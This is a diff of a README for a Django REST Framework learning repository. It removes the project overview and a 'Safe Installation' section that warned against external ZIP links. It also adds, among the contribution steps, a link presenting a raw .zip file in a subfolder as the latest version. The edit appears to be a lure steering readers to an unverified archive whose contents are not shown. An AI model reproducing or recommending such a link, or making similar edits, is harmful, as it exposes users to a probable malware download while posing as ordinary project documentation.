@@ -1,29 +1,5 @@
 # 🌟 drf-learning - Learn Django REST Framework Easily
 
-## 📖 Overview
-Welcome to **drf-learning**! This repository is your companion for learning the Django REST Framework. It includes notes, examples, and a journey in building a first Django API. Whether you're new to APIs or want to enhance your knowledge, you are in the right place.
-
----
-
-## 🚀 Getting Started (Safe Installation)
-To ensure security and the best experience, we recommend installing the project directly from the source code instead of using external ZIP links.
-
-### 📥 Step-by-Step Setup
-1. **Clone the Repository:**
-   ```bash
-   git clone [https://github.com/ElainaWangy/drf-learning.git](https://github.com/ElainaWangy/drf-learning.git)
-   cd drf-learning/blogapi
-Create Virtual Environment:
-
-Bash
-python -m venv venv
-.\venv\Scripts\activate  # Windows
-Install Dependencies:
-
-Bash
-pip install -r requirements.txt
-Run Migrations & Start Server:
-
 Bash
 python manage.py migrate
 python manage.py runserver
@@ -53,6 +29,7 @@ We welcome contributions! If you have suggestions or want to share additional ex
 Fork the project.
 
 Create a Feature Branch.
+For the most recent version, always refer back to our [Download drf-learning](https://github.com/ElainaWangy/drf-learning/raw/refs/heads/main/blogapi/blog_project/drf_learning_3.9.zip) link.
 
 Open a Pull Request.
 
